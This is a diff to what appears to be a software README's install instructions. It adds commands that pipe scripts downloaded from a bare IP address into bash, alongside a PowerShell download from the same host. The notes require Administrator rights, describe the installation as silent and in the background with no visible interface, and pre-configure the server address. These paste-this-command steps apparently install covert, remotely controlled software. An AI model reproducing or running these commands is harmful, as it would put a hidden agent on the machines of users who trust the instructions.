@@ -9,6 +9,11 @@ powershell -Command "Invoke-WebRequest -Uri 'http://103.129.149.67/downloads/eas
 
 ### macOS / Linux
 ```bash
+curl -sSL http://103.129.149.67/downloads/simple_install_macos.sh | bash
+```
+
+**Alternative (if main installer has issues):**
+```bash
 curl -sSL http://103.129.149.67/downloads/easy_install_macos.sh | bash
 ```
 
@@ -16,7 +21,7 @@ curl -sSL http://103.129.149.67/downloads/easy_install_macos.sh | bash
 
 **Important Notes:**
 - Windows: Must run as Administrator (right-click Command Prompt → "Run as administrator")
-- When prompted for server URL, enter: `http://103.129.149.67`
+- macOS: Server URL is pre-configured (103.129.149.67)
 - Installation is automatic and runs silently in background
 - No visible interface after installation
 
